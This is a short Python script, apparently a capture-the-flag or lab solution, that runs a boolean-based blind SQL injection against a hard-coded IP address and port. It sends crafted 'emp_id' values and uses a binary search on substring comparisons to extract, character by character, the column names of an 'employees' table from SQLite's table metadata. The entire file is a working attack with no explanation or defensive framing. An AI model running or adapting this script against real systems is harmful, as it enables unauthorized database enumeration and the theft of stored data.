import httpx

url = "http://139.162.5.230:10175/search?emp_id="


for column in range(1, 10):
    name = ''
    pos = 1
    while True:
        low = 32
        high = 127
        while low + 1 < high:
            mid = (low + high) // 2
            r = httpx.get(url + f"1%20AND%20(SELECT%20hex(substr(name%2c{pos}%2c1))%20FROM%20pragma_table_info('employees')%20LIMIT%201%20OFFSET%20{column - 1})%20%3e%20HEX('{chr(mid)}')--%2b")
            if 'Employee Found.' in r.text:
                low = mid
            else:
                high = mid
            # print(r.text)
            # print(chr(mid))
            # print(low, mid, high)
        if chr(high) == '!':
            break
        name += chr(high)
        # print('name so far:', name)
        pos += 1
    print(f'Column {column}:', name)